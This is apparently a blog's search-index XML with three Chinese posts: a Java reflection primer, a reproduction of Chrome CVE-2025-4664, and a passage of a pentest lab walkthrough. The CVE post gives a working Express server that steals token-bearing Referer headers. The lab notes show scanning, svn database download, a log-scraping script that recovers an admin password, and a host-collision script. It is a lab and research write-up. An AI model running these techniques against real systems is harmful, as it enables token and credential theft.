<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java反射机制详解</title>
      <link href="/2025/05/25/%20Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/"/>
      <url>/2025/05/25/%20Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="反射基础">反射基础</h2><p>个人觉得pdai大佬写的非常不错，本文章内容基本都来自原文<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>，其中有些自己理解的部分，做了些许修改。</p><p><code>RTTI</code>（Run-Time Type Identification）运行时类型识别。在《Thinking in Java》一书第十四章中有提到，其作用是在运行时识别一个对象的类型和类的信息。主要有两种方式：一种是&quot;传统的&quot;<code>RTTI</code>，它假定我们在编译时已经知道了所有的类型；另一种是“反射”机制，<strong>它允许我们在运行时发现和使用类的信息</strong>。</p><p>反射就是把<strong>Java类中的各种成分映射成一个个的Java对象</strong></p><p>例如：一个类有：成员变量、方法、构造方法、包等等信息，利用反射技术可以对一个类进行解剖，把个个组成部分映射成一个个对象。</p><blockquote><p>这里我们首先需要理解 Class类，以及类的加载机制； 然后基于此我们如何通过反射获取Class类以及类中的成员变量、方法、构造方法等。</p></blockquote><h3 id="Class类">Class类</h3><p>Class类，Class类也是一个实实在在的类，存在于JDK的java.lang包中。Class类的实例表示java应用运行时的类(class ans enum)或接口(interface and annotation)（每个java类运行时都在JVM里表现为一个class对象，可通过类名.class、类型.getClass()、Class.forName(“类名”)等方法获取class对象）。数组同样也被映射为class 对象的一个类，所有具有相同元素类型和维数的数组都共享该 Class 对象。基本类型boolean，byte，char，short，int，long，float，double和关键字void同样表现为 class 对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Class</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable,</span><br><span class="line">                              GenericDeclaration,</span><br><span class="line">                              Type,</span><br><span class="line">                              AnnotatedElement &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> ANNOTATION= <span class="number">0x00002000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">ENUM</span>      <span class="operator">=</span> <span class="number">0x00004000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SYNTHETIC</span> <span class="operator">=</span> <span class="number">0x00001000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">registerNatives</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        registerNatives();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Private constructor. Only the Java Virtual Machine creates Class objects.   //私有构造器，只有JVM才能调用创建Class对象</span></span><br><span class="line"><span class="comment">     * This constructor is not used and prevents the default constructor being</span></span><br><span class="line"><span class="comment">     * generated.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Class</span><span class="params">(ClassLoader loader)</span> &#123;</span><br><span class="line">        <span class="comment">// Initialize final field for classLoader.  The initialization value of non-null</span></span><br><span class="line">        <span class="comment">// prevents future JIT optimizations from assuming this final field is null.</span></span><br><span class="line">        classLoader = loader;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>到这我们也就可以得出以下几点信息：</p><ul><li>Class类也是类的一种，与class关键字是不一样的。</li><li><strong>手动编写的类被编译后会产生一个Class对象，其表示的是创建的类的类型信息，而且这个Class对象保存在同名.class的文件中(字节码文件)</strong></li><li>每个通过关键字class标识的类，在内存中有且只有一个与之对应的Class对象来描述其类型信息，无论创建多少个实例对象，其依据的都是用一个Class对象。</li><li><strong>Class类只存私有构造函数，因此对应Class对象只能有JVM创建和加载</strong></li><li><strong>Class类的对象作用是运行时提供或获得某个对象的类型信息</strong>，这点对于反射技术很重要(关于反射稍后分析)。</li></ul><h3 id="类加载">类加载</h3><p>类加载机制和类字节码技术可以参考如下两篇文章：</p><ul><li><strong>JVM基础 - 类字节码详解</strong><sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup><ul><li>源代码通过编译器编译为字节码，再通过类加载子系统进行加载到JVM中运行</li></ul></li><li><strong>JVM基础 - Java 类加载机制</strong><sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup><ul><li>这篇文章将带你深入理解Java 类加载机制</li></ul></li></ul><h2 id="反射的使用">反射的使用</h2><h2 id="反射机制执行的流程">反射机制执行的流程</h2><h2 id="参考">参考</h2><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p><a href="https://pdai.tech/md/java/basic/java-basic-x-reflection.html#%E5%8F%8D%E5%B0%84%E5%9F%BA%E7%A1%80">https://pdai.tech/md/java/basic/java-basic-x-reflection.html#反射基础</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p></li><li id="fn2" class="footnote-item"><p><a href="https://pdai.tech/md/java/jvm/java-jvm-class.html">https://pdai.tech/md/java/jvm/java-jvm-class.html</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p></li><li id="fn3" class="footnote-item"><p><a href="https://pdai.tech/md/java/jvm/java-jvm-classload.html">https://pdai.tech/md/java/jvm/java-jvm-classload.html</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反射机制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google Chrome 跨源数据泄露漏洞(CVE-2025-4664)复现</title>
      <link href="/2025/05/15/Google-Chrome-%E8%B7%A8%E6%BA%90%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2025-4664-%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/05/15/Google-Chrome-%E8%B7%A8%E6%BA%90%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2025-4664-%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>前几天才写了一篇文章<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>，关于数据包中<code>referer</code>头信息泄露的问题。能窃取<code>referer</code>头中的敏感信息。窃取关键是要启用<code>unsafe-url</code>，这里就是前端开发的设置问题了。最近爆出了一个<code>Chrome</code>浏览器的漏洞，就是去窃取用户<code>referer</code>头中的敏感信息，不需要前端启用了<code>unsafe-url</code>也可以实现敏感信息的窃取。最初我在X上看到了提出这个问题的推文<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>，当时好像是说不算是漏洞问题，后面<code>Google</code>给了<code>CVE</code>，定级为<code>CVE-2025-4664</code>。下面我们来复现一下这个漏洞。</p><h2 id="漏洞描述">漏洞描述</h2><p>Google 发布公告称**Google Chrome 跨源数据泄露漏洞(CVE-2025-4664)**存在在野利用，该漏洞源于 Google Chrome 加载程序中的策略执行不足，远程攻击者利用此漏洞可使浏览器发起请求时携带完整的URL，导致敏感信息泄露<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>。<strong>目前该漏洞已发现在野利用。</strong></p><p>鉴于此漏洞影响范围较大，建议客户尽快做好自查及防护。⚠️⚠️⚠️</p><h2 id="漏洞影响版本">漏洞影响版本</h2><blockquote><p>Google Chrome(Windows/Mac) &lt; 136.0.7103.113/.114</p><p>Google Chrome(Linux) &lt; 136.0.7103.113</p></blockquote><h2 id="漏洞复现">漏洞复现</h2><p>还是按照之前写的<sup class="footnote-ref"><a href="#fn1" id="fnref1:1">[1:1]</a></sup>。</p><ul><li><code>A</code>为<code>URL</code>：<code>http://127.0.0.1:3000/index.html?token=xxxxxx</code></li><li><code>B</code>为这个<code>index.html</code>页面，其中<code>img</code>标签的<code>src</code>属性我们可控，<strong>其页面不启用<code>unsafe-url</code></strong>。</li></ul><blockquote><p>攻击效果： 受害者会带着自己的<code>token</code>，就是这里的<code>A</code>，访问到页面<code>B</code>，<code>B</code>中的<code>img</code>标签的<code>src</code>属性我们可控，设置为攻击者监听数据包的脚本，监听的数据包中包含有敏感信息的<code>referer</code>，进而实现信息的窃取。</p></blockquote><p><code>B</code>的<code>index.html</code>页面内容如下，其中的<code>http://127.0.0.1:3001/image</code>为攻击者嵌入的监听数据包的恶意<code>URL</code>，这里为了演示方便我使用了本地的<code>127.0.0.1:3001</code>表示。这里页面没启用<code>unsafe-url</code>，正常是窃取不到<code>referer</code>头中的敏感信息的。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Logo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Logo Picture<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:3001/image&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Logo Picture&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>对于<code>http://127.0.0.1:3001/image</code>的后端代码<code>main.js</code>如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3001</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/image&#x27;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Link&#x27;</span>,<span class="string">&#x27;&lt;http://127.0.0.1:3001/log&gt;;rel=&quot;preload&quot;; as=&quot;image&quot;;referrerpolicy=&quot;unsafe-url&quot;&#x27;</span>)</span><br><span class="line">    res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&#x27;logo.png&#x27;</span>))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/log&#x27;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">headers</span>[<span class="string">&#x27;referer&#x27;</span>]);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Hi!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port,<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server running at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>本地使用<code>python3 -m http.server 3000</code>启用一个<code>web</code>服务，把<code>B</code>这个<code>index.html</code>页面放在当前启用<code>web</code>服务的目录下，受害者访问<code>A</code>，即<code>http://127.0.0.1:3000/index.html?token=secret</code>，表示受害者正常访问页面，到达了<code>B</code>。</p><p>攻击者在自己的<code>vps</code>上<code>node main.js</code>运行恶意的脚本，即得到这里的<code>http://127.0.0.1:3001/image</code>。将这个恶意的<code>URL</code>，嵌入到<code>B</code>这个正常安全的页面中去，前提是<code>B</code>的<code>src</code>属性是攻击者可控的。</p><p>受害者使用不安全的<code>Google Chrome</code>浏览器版本，去访问安全<code>Referer-Policy</code>配置的 <code>B</code>页面时，就会导致<code>referer</code>头中的敏感信息泄露。</p><p><img src="/2025/05/15/Google-Chrome-%E8%B7%A8%E6%BA%90%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2025-4664-%E5%A4%8D%E7%8E%B0/image-20250515214503409.png" alt="image-20250515214503409"></p><p>结果如下：</p><p><img src="/2025/05/15/Google-Chrome-%E8%B7%A8%E6%BA%90%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2025-4664-%E5%A4%8D%E7%8E%B0/image-20250515223129119.png" alt="image-20250515223129119"></p><p><img src="/2025/05/15/Google-Chrome-%E8%B7%A8%E6%BA%90%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2025-4664-%E5%A4%8D%E7%8E%B0/image-20250515223008246.png" alt="image-20250515223008246"></p><p><img src="/2025/05/15/Google-Chrome-%E8%B7%A8%E6%BA%90%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2025-4664-%E5%A4%8D%E7%8E%B0/image-20250515214647072.png" alt="image-20250515214647072"></p><p>我使用的<code>Chrome</code>版本如下，低于安全版本。</p><p><img src="/2025/05/15/Google-Chrome-%E8%B7%A8%E6%BA%90%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2025-4664-%E5%A4%8D%E7%8E%B0/image-20250515214726592.png" alt="image-20250515214726592"></p><h2 id="参考">参考</h2><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p><a href="https://x2nn.github.io/2025/05/06/%E6%95%B0%E6%8D%AE%E5%8C%85referer%E5%A4%B4%E4%B8%AD%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E7%AA%83%E5%8F%96/">https://x2nn.github.io/2025/05/06/数据包referer头中敏感信息的窃取/</a> <a href="#fnref1" class="footnote-backref">↩︎</a> <a href="#fnref1:1" class="footnote-backref">↩︎</a></p></li><li id="fn2" class="footnote-item"><p><a href="https://x.com/slonser_/status/1919439373986107814">https://x.com/slonser_/status/1919439373986107814</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p></li><li id="fn3" class="footnote-item"><p><a href="https://mp.weixin.qq.com/s/Gz0PBUfFv4Cz7FUNDjYTcQ">https://mp.weixin.qq.com/s/Gz0PBUfFv4Cz7FUNDjYTcQ</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> Web漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息泄露 </tag>
            
            <tag> Referer-Policy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>暗月项目六内网域渗透笔记</title>
      <link href="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建">环境搭建</h2><p>靶场环境的拓扑图如下：</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512124656889.png" alt="image-20250512124656889"></p><p>靶场是<code>webhack123</code>，<code>WEB</code>服务器有两块网卡，<code>DC</code>是域控。</p><h2 id="信息收集">信息收集</h2><h3 id="端口探测">端口探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.1.13</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512125122545.png" alt="image-20250512125122545"></p><h3 id="nmap获取系统和版本信息">nmap获取系统和版本信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80,135,139,445,3306,3389,47001,49152,49153,49154,49155,49156,49157 -A 192.168.1.13 -oA webhack</span><br></pre></td></tr></table></figure><p>由扫描的信息可知，<code>web</code>服务器使用的是<code>phpstudy</code>。操作系统为<code>Windows Server 2008 R2</code></p><h2 id="对网站进行测试">对网站进行测试</h2><p>在<code>Mac</code>的<code>hosts</code>文件中添加<code>192.168.1.13 www.webhack123.com</code>和<code>192.168.1.13 admin.webhack123.com</code>，这样我的<code>Mac</code>通过域名就可访问到对应的网站。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512124840963.png" alt="image-20250512124840963"></p><h3 id="ffuf目录文件扫描">ffuf目录文件扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://www.webhack123.com/FUZZ -w Wordslist/all.txt</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512125641975.png" alt="image-20250512125641975"></p><h3 id="wc-db文件下载">wc.db文件下载</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.webhack123.com/.svn/wc.db</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512130405171.png" alt="image-20250512130405171"></p><p>使用<code>Navicat</code>打开数据库，可以看出使用到的框架为<code>thinkphp</code></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512130708281.png" alt="image-20250512130708281"></p><h3 id="thinkphp日志文件泄露">thinkphp日志文件泄露</h3><p>在<code>thinkphp_3.1.3</code>中，日志文件是开启的，由<code>wc.db</code>可以知道目录位置。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512131128450.png" alt="image-20250512131128450"></p><p>日志路径格式如：<a href="http://www.webhack123.com/App/Runtime/Logs/18_06_28.log">http://www.webhack123.com/App/Runtime/Logs/18_06_28.log</a></p><h3 id="提取日志获取密码">提取日志获取密码</h3><p>使用<code>python</code>编写日志文件提取脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding：utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =<span class="string">&quot;http://www.webhack123.com/App/Runtime/Logs&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_urls</span>(<span class="params">patch,y</span>):</span><br><span class="line">    urls=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">if</span> i&lt;<span class="number">10</span>:</span><br><span class="line">                <span class="keyword">if</span> j&lt;<span class="number">10</span>:</span><br><span class="line">                    urls.append(patch+<span class="string">&quot;/%s_0%s_0%s.log&quot;</span> % (y,i,j))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    urls.append(patch+<span class="string">&quot;/%s_0%s_%s.log&quot;</span> % (y,i,j))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> j&lt;<span class="number">10</span>:</span><br><span class="line">                    urls.append(patch+<span class="string">&quot;/%s_%s_0%s.log&quot;</span> % (y,i,j))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    urls.append(patch+<span class="string">&quot;/%s_%s_%s.log&quot;</span> % (y,i,j))</span><br><span class="line">                    </span><br><span class="line">    <span class="keyword">return</span> urls</span><br><span class="line"></span><br><span class="line">urls = add_urls(url,<span class="string">&quot;20&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> urls:</span><br><span class="line">    req=requests.get(i)</span><br><span class="line">    <span class="keyword">if</span> req.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">    html = req.text</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;webhack123.txt&quot;</span>,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(html)</span><br></pre></td></tr></table></figure><p>获取日志，并在日志中查找到泄露的管理员密码。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512132623141.png" alt="image-20250512132623141"></p><p>账号为<code>admin</code>，密码的哈希为<code>74c774ef39b5b977c1fd59dbfc73c3e380a65aa3</code>，经过<code>cmd5</code>得出密码为<code>web123</code>。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512132826440.png" alt="image-20250512132826440"></p><h3 id="host碰撞管理后台子域名">host碰撞管理后台子域名</h3><p>如果扫描目录还是找不到后台，可以尝试进行<code>host</code>碰撞出子域名。</p><p>代码参考<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>，变动了一下代码，<code>ip.txt</code>用于存放目标的<code>IP</code>地址，<code>host.txt</code>用于存放子域名前缀。这里是<code>http</code>，不需要进行<code>https</code>的爆破。运行代码，子域名和<code>IP</code>地址进行匹配。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#这是一个用于IP和域名碰撞匹配访问的小工具(修改过)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lists=[]</span><br><span class="line">files = <span class="built_in">open</span>(<span class="string">&#x27;hosts_ok.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>)</span><br><span class="line"><span class="comment">#读取IP地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;====================================开 始 匹 配====================================&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> iplist <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;ip.txt&quot;</span>):</span><br><span class="line">    ip = iplist.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#读取host地址</span></span><br><span class="line">    <span class="comment">#http_s = [&#x27;http://&#x27;,&#x27;https://&#x27;]</span></span><br><span class="line">    http_s = [<span class="string">&#x27;http://&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> http_s :</span><br><span class="line">        <span class="keyword">for</span> hostlist <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;host.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>):</span><br><span class="line">            tmp = hostlist.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            host = tmp+<span class="string">&#x27;.webhack123.com&#x27;</span></span><br><span class="line">            headers = &#123;<span class="string">&#x27;Host&#x27;</span>:host,<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.session()</span><br><span class="line">                requests.packages.urllib3.disable_warnings()</span><br><span class="line">                rhost = r.get(h + ip,verify=<span class="literal">False</span>,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">                rhost.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">                title = re.search(<span class="string">&#x27;&lt;title&gt;(.*)&lt;/title&gt;&#x27;</span>, rhost.text).group(<span class="number">1</span>) <span class="comment">#获取标题</span></span><br><span class="line">                info = <span class="string">&#x27;%s -- %s 协议：%s 数据包大小：%d 标题：%s&#x27;</span> % (ip,host,h,<span class="built_in">len</span>(rhost.text),title)</span><br><span class="line">                lists.append(info)</span><br><span class="line">                files.write(info + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(info)</span><br><span class="line">            <span class="keyword">except</span> Exception :</span><br><span class="line">                error = ip + <span class="string">&quot; --- &quot;</span> + host + <span class="string">&quot; --- 访问失败！~&quot;</span></span><br><span class="line">                <span class="built_in">print</span>(error)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;====================================匹 配 成 功 的 列 